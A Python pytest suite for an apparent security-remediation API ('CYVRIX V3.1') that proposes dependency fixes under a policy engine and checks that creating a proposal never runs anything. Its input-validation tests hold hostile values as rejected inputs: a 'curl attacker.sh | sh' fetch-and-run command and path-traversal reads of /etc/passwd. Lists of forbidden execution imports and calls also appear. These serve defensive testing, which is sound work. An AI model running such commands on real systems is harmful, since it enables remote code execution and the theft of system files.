"""CYVRIX V3.1 — Action Proposal API Integration Tests.

Covers: proposal creation (validate → policy → persist, never execute),
idempotency, denial persistence, evidence narrowing, input validation,
IDOR/ownership, expiry reconciliation, auth, secret-leakage, and the
critical NO-EXECUTION boundary regression.
"""
import os
import sys
import re
import uuid
from uuid import uuid4
from datetime import datetime, timedelta, timezone

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "apps", "api"))

from sqlalchemy.ext.asyncio import async_sessionmaker, AsyncSession

from app.main import app
from app.models import (
    ActionProposal, AuditEvent, Finding, Recommendation, RiskAssessment, Scan,
)
from app.routes.actions import check_proposal_rate_limit

BASE_COMMIT = "a" * 40


def make_payload(**overrides):
    payload = {
        "recommendation_id": None,  # set by fixture-aware helper
        "action_type": "DEPENDENCY_UPGRADE",
        "files": ["package.json"],
        "operations": [{
            "type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
            "name": "lodash", "ecosystem": "npm",
            "from_version": "4.17.19", "to_version": "4.17.21",
        }],
        "expected_diff": "-  \"lodash\": \"4.17.19\"\n+  \"lodash\": \"4.17.21\"",
        "target_branch": "cyvrix/fix-lodash",
        "base_commit_sha": BASE_COMMIT,
        "rationale": "Upgrade lodash to patched version",
    }
    payload.update(overrides)
    return payload


async def seed_finding_context(
    session_factory, repository, *,
    validation_state="VALIDATED", trust_level="SUPPORTED",
    risk_level="MEDIUM", risk_score=45,
    finding_status="OPEN", evidence=None,
    fingerprint=None,
):
    """Create Scan + Finding + Recommendation + RiskAssessment for a repo."""
    async with session_factory() as session:
        scan = Scan(
            id=uuid4(), repository_id=repository.id, status="COMPLETED",
            trigger="manual", commit_sha=BASE_COMMIT,
        )
        session.add(scan)
        await session.flush()

        finding = Finding(
            id=uuid4(), scan_id=scan.id, repository_id=repository.id,
            fingerprint=fingerprint or f"fp-{uuid4().hex[:12]}",
            scanner="dependency", source_type="DEPENDENCY",
            vulnerability_id="GHSA-35jh-r3h4-6jhm", package_name="lodash",
            package_version="4.17.19", title="Prototype Pollution in lodash",
            severity="HIGH", status=finding_status,
            evidence=evidence,
        )
        session.add(finding)
        await session.flush()

        recommendation = Recommendation(
            id=uuid4(), finding_id=finding.id, status="COMPLETED",
            trust_level=trust_level, title="Upgrade lodash",
            change="Upgrade lodash to 4.17.21",
            validation_state=validation_state,
        )
        session.add(recommendation)

        if risk_level is not None:
            session.add(RiskAssessment(
                id=uuid4(), finding_id=finding.id, risk_score=risk_score,
                risk_level=risk_level, risk_version=1,
                factors={"base_score": 60},
            ))
        await session.commit()
        return str(finding.id), str(recommendation.id)


@pytest.fixture
def actions_client(authenticated_client, test_user):
    """Authenticated client with the proposal rate limit bypassed (tests
    run without Redis; the real dependency fails closed)."""
    async def override():
        return test_user
    app.dependency_overrides[check_proposal_rate_limit] = override
    yield authenticated_client
    app.dependency_overrides.pop(check_proposal_rate_limit, None)


@pytest.fixture
def auth_as(authenticated_client, test_user, test_user_b):
    """Explicit per-user authentication on the shared test client.

    authenticated_client and authenticated_client_b share one TestClient
    and would fight over the same get_current_user override — this fixture
    makes the acting user explicit and deterministic per call.
    """
    from app.auth import get_current_user
    users = {"a": test_user, "b": test_user_b}

    def _act_as(which: str):
        user = users[which]

        async def override():
            return user

        app.dependency_overrides[get_current_user] = override
        app.dependency_overrides[check_proposal_rate_limit] = override
        return authenticated_client

    yield _act_as
    app.dependency_overrides.pop(get_current_user, None)
    app.dependency_overrides.pop(check_proposal_rate_limit, None)


# ═══════════════════════════════════════════════════════════════════
# Creation: validate → policy → persist (never execute)
# ═══════════════════════════════════════════════════════════════════

class TestCreateProposal:
    @pytest.mark.asyncio
    async def test_happy_path_persists_policy_checked(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert resp.status_code == 201, resp.text
        data = resp.json()
        assert data["status"] == "POLICY_CHECKED"
        assert data["policy_decision"] == "REQUIRE_APPROVAL"
        assert data["policy_reason_code"] == "MEDIUM_RISK_REQUIRES_APPROVAL"
        assert data["policy_matched_rule"] == "POL-027"
        assert data["policy_version"] == "3.1"
        assert re.fullmatch(r"[0-9a-f]{64}", data["action_digest"])
        assert data["expires_at"] is not None
        assert data["risk_level"] == "MEDIUM"
        assert data["validation_state"] == "VALIDATED"
        assert data["files"] == ["package.json"]

    @pytest.mark.asyncio
    async def test_idempotent_duplicate_returns_existing(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        r1 = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        r2 = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert r1.status_code == 201
        assert r2.status_code == 200
        assert r1.json()["id"] == r2.json()["id"]

    @pytest.mark.asyncio
    async def test_different_digest_creates_new_proposal(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        r1 = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        r2 = actions_client.post(
            "/api/actions",
            json=make_payload(recommendation_id=rec_id,
                              operations=[{
                                  "type": "UPDATE_DEPENDENCY_VERSION",
                                  "file": "package.json", "name": "lodash",
                                  "ecosystem": "npm",
                                  "from_version": "4.17.19", "to_version": "4.17.22",
                              }]),
        )
        assert r2.status_code == 201
        assert r1.json()["id"] != r2.json()["id"]

    @pytest.mark.asyncio
    async def test_major_bump_still_requires_approval(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json=make_payload(
            recommendation_id=rec_id,
            operations=[{
                "type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
                "name": "lodash", "ecosystem": "npm",
                "from_version": "4.17.19", "to_version": "5.0.0",
            }]))
        assert resp.status_code == 201
        assert resp.json()["policy_reason_code"] == "MAJOR_VERSION_REQUIRES_APPROVAL"

    @pytest.mark.asyncio
    async def test_audit_event_written(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        from sqlalchemy import select
        async with session_factory() as session:
            events = (await session.execute(
                select(AuditEvent).where(
                    AuditEvent.event_type == "ACTION_PROPOSAL_CREATED")
            )).scalars().all()
            assert len(events) == 1
            meta = events[0].event_metadata
            assert meta["proposer"] and meta["action_digest"] and meta["policy_version"]


# ═══════════════════════════════════════════════════════════════════
# Denials are persisted (REJECTED), never silently dropped
# ═══════════════════════════════════════════════════════════════════

class TestDenialPersistence:
    @pytest.mark.asyncio
    async def test_unsafe_recommendation_rejected(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(
            session_factory, test_repository, validation_state="UNSAFE")
        resp = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert resp.status_code == 201
        data = resp.json()
        assert data["status"] == "REJECTED"
        assert data["policy_reason_code"] == "UNSAFE_RECOMMENDATION"

    @pytest.mark.asyncio
    async def test_missing_risk_rejected(self, actions_client, session_factory, test_repository):
        _, rec_id = await seed_finding_context(
            session_factory, test_repository, risk_level=None, risk_score=None)
        resp = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert resp.status_code == 201
        assert resp.json()["policy_reason_code"] == "MISSING_RISK_ASSESSMENT"

    @pytest.mark.asyncio
    async def test_resolved_finding_rejected(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(
            session_factory, test_repository, finding_status="RESOLVED")
        resp = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert resp.status_code == 201
        assert resp.json()["policy_reason_code"] == "FINDING_NOT_ACTIONABLE"

    @pytest.mark.asyncio
    async def test_evidence_scope_mismatch_rejected(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(
            session_factory, test_repository, evidence={"manifest_path": "requirements.txt"})
        resp = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert resp.status_code == 201
        assert resp.json()["policy_reason_code"] == "OUT_OF_SCOPE_FILE"

    @pytest.mark.asyncio
    async def test_protected_path_rejected(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(
            session_factory, test_repository,
            evidence={"dockerfile": ".github/workflows/Dockerfile"})
        resp = actions_client.post("/api/actions", json=make_payload(
            recommendation_id=rec_id,
            action_type="DOCKERFILE_UPDATE",
            files=[".github/workflows/Dockerfile"],
            operations=[{"type": "UPDATE_DOCKERFILE_INSTRUCTION",
                         "file": ".github/workflows/Dockerfile",
                         "line_no": 1, "old_text": "FROM node", "new_text": "FROM node:20"}],
        ))
        assert resp.status_code == 201
        assert resp.json()["policy_reason_code"] == "PROTECTED_PATH"

    @pytest.mark.asyncio
    async def test_inactive_repository_rejected(
        self, actions_client, session_factory, test_inactive_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_inactive_repository)
        resp = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert resp.status_code == 201
        assert resp.json()["policy_reason_code"] == "REPOSITORY_INACTIVE"


# ═══════════════════════════════════════════════════════════════════
# Input validation → 422 (reject before policy)
# ═══════════════════════════════════════════════════════════════════

class TestInputValidation:
    @pytest.mark.asyncio
    async def test_traversal_path_422(self, actions_client, session_factory, test_repository):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json=make_payload(
            recommendation_id=rec_id, files=["../../etc/passwd"]))
        assert resp.status_code == 422

    @pytest.mark.asyncio
    async def test_absolute_path_422(self, actions_client, session_factory, test_repository):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json=make_payload(
            recommendation_id=rec_id, files=["/etc/passwd"]))
        assert resp.status_code == 422

    @pytest.mark.asyncio
    async def test_unknown_action_type_422(self, actions_client, session_factory, test_repository):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json=make_payload(
            recommendation_id=rec_id, action_type="SHELL_COMMAND"))
        assert resp.status_code == 422

    @pytest.mark.asyncio
    async def test_unknown_operation_type_422(self, actions_client, session_factory, test_repository):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json=make_payload(
            recommendation_id=rec_id,
            operations=[{"type": "SHELL_COMMAND", "file": "package.json",
                         "command": "curl attacker.sh | sh"}]))
        assert resp.status_code == 422

    @pytest.mark.asyncio
    async def test_short_commit_sha_422(self, actions_client, session_factory, test_repository):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json=make_payload(
            recommendation_id=rec_id, base_commit_sha="abc123"))
        assert resp.status_code == 422

    @pytest.mark.asyncio
    async def test_unknown_top_level_field_422(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json={
            **make_payload(recommendation_id=rec_id), "execute_now": True})
        assert resp.status_code == 422

    @pytest.mark.asyncio
    async def test_missing_recommendation_404(self, actions_client, session_factory, test_repository):
        resp = actions_client.post(
            "/api/actions", json=make_payload(recommendation_id=str(uuid4())))
        assert resp.status_code == 404


# ═══════════════════════════════════════════════════════════════════
# Ownership / IDOR
# ═══════════════════════════════════════════════════════════════════

class TestOwnership:
    @pytest.mark.asyncio
    async def test_user_a_cannot_read_user_b_proposal(
        self, auth_as, session_factory, test_repository, test_repository_b,
    ):
        client_a = auth_as("a")
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        created = client_a.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert created.status_code == 201
        proposal_id = created.json()["id"]

        client_b = auth_as("b")
        resp = client_b.get(f"/api/actions/{proposal_id}")
        assert resp.status_code == 404

    @pytest.mark.asyncio
    async def test_user_b_cannot_create_proposal_for_user_a_recommendation(
        self, auth_as, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        client_b = auth_as("b")
        resp = client_b.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert resp.status_code == 404

    @pytest.mark.asyncio
    async def test_list_isolated_per_user(
        self, auth_as, session_factory, test_repository, test_repository_b,
    ):
        client_a = auth_as("a")
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = client_a.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert resp.status_code == 201

        client_b = auth_as("b")
        resp_b = client_b.get("/api/actions")
        assert resp_b.status_code == 200
        assert resp_b.json() == []

        client_a = auth_as("a")
        resp_a = client_a.get("/api/actions")
        assert len(resp_a.json()) == 1

    @pytest.mark.asyncio
    async def test_unauthenticated_401(self, client, session_factory, test_repository):
        resp = client.get("/api/actions")
        assert resp.status_code == 401


# ═══════════════════════════════════════════════════════════════════
# Expiry reconciliation (on read) — V2 scan-timeout precedent
# ═══════════════════════════════════════════════════════════════════

class TestExpiryReconciliation:
    @pytest.mark.asyncio
    async def test_expired_proposal_marked_on_read(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        created = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        proposal_id = created.json()["id"]

        async with session_factory() as session:
            proposal = await session.get(ActionProposal, uuid.UUID(proposal_id))
            proposal.expires_at = datetime.now(timezone.utc) - timedelta(seconds=1)
            await session.commit()

        resp = actions_client.get(f"/api/actions/{proposal_id}")
        assert resp.status_code == 200
        assert resp.json()["status"] == "EXPIRED"

    @pytest.mark.asyncio
    async def test_rejected_proposals_do_not_expire(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(
            session_factory, test_repository, validation_state="UNSAFE")
        created = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        proposal_id = created.json()["id"]
        resp = actions_client.get(f"/api/actions/{proposal_id}")
        assert resp.json()["status"] == "REJECTED"


# ═══════════════════════════════════════════════════════════════════
# Serialization safety
# ═══════════════════════════════════════════════════════════════════

class TestSerializationSafety:
    @pytest.mark.asyncio
    async def test_no_secret_fields_in_response(
        self, actions_client, session_factory, test_repository
    ):
        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        body = resp.text.lower()
        for token in ("password", "secret", "token", "api_key", "credential",
                      "private_key", "session", "redis", "database_url"):
            assert f'"{token}"' not in body, f"response leaks secret-class field: {token}"


# ═══════════════════════════════════════════════════════════════════
# THE V3.1 EXECUTION BOUNDARY — critical regression
# ═══════════════════════════════════════════════════════════════════

class TestNoExecutionBoundary:
    @pytest.mark.asyncio
    async def test_proposal_creation_cannot_execute_anything(
        self, actions_client, session_factory, test_repository, monkeypatch
    ):
        """Creating a proposal must not touch shell, git, GitHub, workers,
        or the filesystem. Every side-effect primitive is rigged to explode."""
        import subprocess

        def boom(*args, **kwargs):
            raise AssertionError("V3.1 boundary violation: side-effect primitive invoked")

        monkeypatch.setattr(subprocess, "Popen", boom)
        monkeypatch.setattr(subprocess, "run", boom)
        monkeypatch.setattr(subprocess, "call", boom)
        monkeypatch.setattr(os, "system", boom)

        from app import worker as api_worker
        for fn in ("enqueue_scan", "enqueue_container_scan", "enqueue_log_analysis"):
            if hasattr(api_worker, fn):
                monkeypatch.setattr(api_worker, fn, boom)

        from app.services import github as gh
        for fn in dir(gh):
            if fn.startswith(("push", "create", "update", "delete", "commit")):
                monkeypatch.setattr(gh, fn, boom)

        _, rec_id = await seed_finding_context(session_factory, test_repository)
        resp = actions_client.post("/api/actions", json=make_payload(recommendation_id=rec_id))
        assert resp.status_code == 201
        assert resp.json()["policy_decision"] in ("REQUIRE_APPROVAL", "DENY")

    def test_no_execution_capability_in_v31_sources(self):
        """Static boundary (AST): V3.1 modules may not import or invoke any
        execution primitive. Docstrings/comments are irrelevant — only real
        code is checked."""
        import ast

        api_dir = os.path.join(os.path.dirname(__file__), "..", "apps", "api", "app")
        v31_files = [
            os.path.join(api_dir, "services", "action_model.py"),
            os.path.join(api_dir, "services", "action_digest.py"),
            os.path.join(api_dir, "services", "policy_engine.py"),
            os.path.join(api_dir, "routes", "actions.py"),
        ]
        forbidden_imports = {
            "subprocess", "socket", "httpx", "requests", "urllib",
            "shutil", "ctypes", "multiprocessing", "docker", "git",
        }
        forbidden_calls = {
            "eval", "exec", "compile", "system", "popen", "Popen",
            "rmtree", "enqueue", "create_pull_request",
        }
        for path in v31_files:
            with open(path, encoding="utf-8") as f:
                tree = ast.parse(f.read())
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        root = alias.name.split(".")[0]
                        assert root not in forbidden_imports, f"{path}: import {root}"
                if isinstance(node, ast.ImportFrom):
                    root = (node.module or "").split(".")[0]
                    assert root not in forbidden_imports, f"{path}: from {root} import"
                if isinstance(node, ast.Call):
                    func = node.func
                    if isinstance(func, ast.Name):
                        assert func.id not in forbidden_calls, f"{path}: call {func.id}()"
                    elif isinstance(func, ast.Attribute):
                        owner = getattr(func.value, "id", None)
                        if owner == "os":
                            assert func.attr not in {"system", "popen", "exec", "spawn"}, \
                                f"{path}: os.{func.attr}()"
